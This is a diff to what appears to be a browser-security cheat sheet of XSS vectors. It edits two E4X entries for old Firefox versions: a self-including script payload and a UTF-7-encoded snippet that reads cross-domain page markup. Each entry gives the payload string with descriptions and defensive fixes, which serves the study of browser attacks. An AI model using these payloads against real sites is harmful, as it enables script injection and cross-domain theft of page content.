@@ -397,7 +397,7 @@ var items =
         'category'   : 'e4x', 
         'name'       : 'Self-including E4X-based JavaScript snippet',
         'data'       : '<script src="#">{%js_alert%}</script>;1',
-        'description': 'This <SCRIPT> tag tries to include the very same page it is being executed from - and then executed the {}-delimited E4X payload. To avoid having Firefox throw an error during inclusion the ending sequence ;0 is necessary.',
+        'description': 'This <SCRIPT> tag tries to include the very same page it is being executed from - and then executes the {}-delimited E4X payload. To avoid having Firefox throw an error during inclusion the ending sequence ;0 is necessary.',
         'tickets'    : [],
         'howtofix'   : 'E4X is extremely dangerous since any page can include sources providing valid XML and the mentioned semi-colon delimiter. For effective protection websites must be applied with a DOCTYPE - or contain invalid markup. There are many variations for the ending delimiter - as long it is valid JavaScript and not indicating the page is XML only it will work (;1, ,1, ._, etc..)',            
         'browsers'   : {
@@ -406,18 +406,18 @@ var items =
         'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'self-inclusion'],
         'reporter'   : '.mario'
     },
-    { /* ID 26 - E4X-based JavaScript snippet stealing markup  */
+    { /* ID 26 - E4X-based UTF7 JavaScript snippet stealing cross-domain markup  */
         'id'         : 26,
         'category'   : 'e4x', 
-        'name'       : 'E4X-based JavaScript snippet stealing markup',
-        'data'       : '<body><div>top secret</div></body>.toXMLString().match(/.*/m),alert(RegExp.input);',
-        'description': 'In case an attacker can inject the character sequence beginning with .toXMLString() it\'s possible to inclde the victimized website in a <SCRIPT> tag loaded from an arbitrary page and steal the markup of the included page - across domain broders.',
+        'name'       : 'E4X-based UTF7 JavaScript/HTML snippet stealing cross-domain markup',
+        'data'       : '+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);',
+        'description': 'In case an attacker can inject the character sequence beginning with .toXMLString() it\'s possible to inclde the victimized website in a <SCRIPT> tag loaded from an arbitrary page and steal the markup of the included page - across domain broders. Note that the whole vector is encoded in UTF7. This is possible since the including <SCRIPT> tag can decide via charset attribute what charset to use.',
         'tickets'    : [],
-        'howtofix'   : 'E4X is extremely dangerous since any page can include sources providing valid XML and the mentioned semi-colon delimiter. For effective protection websites must be applied with a DOCTYPE - or contain invalid markup. There are many variations for the ending delimiter - as long it is valid JavaScript and not indicating the page is XML only it will work (;1, ,1, ._, etc..)',            
+        'howtofix'   : 'Make sure all sites are being applied with a defined charset like UTF-8. Also incoming data should be converted from UTF-7 before being escaped with htmlentities() or comparable methods. All websites containing sensitive data should be applied with a DOCTYPE.',            
         'browsers'   : {
             'firefox' : ['1.5', '2.x', '3.x'], 
         },
-        'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'stealing'],
+        'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'stealing', 'utf7'],
         'reporter'   : '.mario'
     }
 ]
